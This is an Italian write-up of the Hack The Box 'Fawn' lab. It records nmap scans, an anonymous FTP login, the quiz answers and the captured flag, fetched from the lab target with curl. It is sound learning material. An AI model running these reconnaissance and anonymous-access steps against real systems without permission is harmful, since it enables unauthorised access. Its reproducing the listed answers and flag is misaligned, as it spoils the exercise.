# HTB Starting Point – Fawn

Difficoltà: Very Easy  
Data: 14/11/2025  
Orario: 18:50 – 19:38

---

## Connessione alla VPN

È stato utilizzato lo stesso file `.ovpn` scaricato in precedenza nella directory `sf_shared` della VM Kali Linux.  
La connessione alla VPN di Hack The Box è stata avviata tramite:

sudo openvpn --config /media/sf_Shared/starting_point_ctrlxrico.ovpn --daemon

IP assegnato: 10.10.15.9  
Target: 10.129.3.183

---

## Verifica della Connettività

ping -c 5 10.129.3.183  
PING 10.129.3.183 (10.129.3.183) 56(84) bytes of data.  
64 bytes from 10.129.3.183: icmp_seq=1 ttl=63 time=57.9 ms  
64 bytes from 10.129.3.183: icmp_seq=2 ttl=63 time=58.2 ms  
64 bytes from 10.129.3.183: icmp_seq=3 ttl=63 time=1358 ms  
64 bytes from 10.129.3.183: icmp_seq=4 ttl=63 time=345 ms  
64 bytes from 10.129.3.183: icmp_seq=5 ttl=63 time=58.4 ms

--- 10.129.3.183 ping statistics ---  
5 packets transmitted, 5 received, 0% packet loss, time 4023ms  
rtt min/avg/max/mdev = 57.893/375.562/1357.897/503.606 ms

Il target risponde correttamente.

---

## Scansione delle Porte

È stata eseguita una scansione Nmap di base:

nmap 10.129.3.183  
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-11-14 19:02 CET  
Nmap scan report for 10.129.3.183  
Host is up (0.065s latency).  
Not shown: 999 closed tcp ports (reset)  
PORT STATE SERVICE  
21/tcp open ftp

Nmap done: 1 IP address (1 host up) scanned in 1.22 seconds

Porta individuata:  
21/tcp – FTP

---

## Task di Verifica

### Task 1 – Significato dell’acronimo FTP

Risposta: File Transfer Protocol  
Stato: Corretta

---

### Task 2 – Porta predefinita del servizio FTP

Risposta: Porta 21  
Stato: Corretta

---

### Task 3 – Protocollo sicuro alternativo a FTP (su SSH)

Risposta: SFTP  
Stato: Corretta

---

### Task 4 – Comando per inviare una richiesta ICMP Echo

Risposta: ping  
Stato: Corretta

---

### Task 5 – Versione FTP rilevata sul target

Risposta: vsftpd 3.0.3  
Stato: Corretta

Scansione versione:

nmap -sV 10.129.3.183  
PORT STATE SERVICE VERSION  
21/tcp open ftp vsftpd 3.0.3  
Service Info: OS: Unix

---

### Task 6 – Sistema operativo identificato

Risposta: Unix  
Stato: Corretta

---

### Task 7 – Comando per visualizzare l’help del client FTP

Risposta: ftp -?  
Stato: Corretta

---

### Task 8 – Username usato per l’accesso FTP senza account

Risposta: anonymous  
Stato: Corretta

---

### Task 9 – Codice di risposta FTP per “Login successo”

Risposta: 230  
Stato: Corretta

Evidenza:

ftp -a 10.129.3.183  
Connected to 10.129.3.183.  
220 (vsFTPd 3.0.3)  
331 Please specify the password.  
230 Login successful.  
Remote system type is UNIX.

---

### Task 10 – Comando Linux comune per elencare file (alternativa a dir)

Risposta: ls  
Stato: Corretta

Evidenza:

ftp> ls  
229 Entering Extended Passive Mode  
150 Here comes the directory listing.  
-rw-r--r-- 1 0 0 32 Jun 04 2021 flag.txt  
226 Directory send OK.

---

### Task 11 – Comando per scaricare un file da FTP

Risposta: get  
Stato: Corretta

---

## Task 12 – Recupero della Flag

Il download tramite FTP ha restituito un errore di permessi:

ftp> get flag.txt  
ftp: Can't access `flag.txt': Permission denied

La flag è stata recuperata tramite curl:

curl ftp://anonymous:@10.129.3.183/flag.txt

Flag:  
035db21c881520061c53e0536e44f815

Stato: Corretta

---

## Note

Questa macchina evidenzia i rischi legati alla configurazione errata dei server FTP, soprattutto quando l’accesso anonimo è abilitato.  
Dimostra come una semplice enumerazione possa permettere l’accesso a file sensibili.
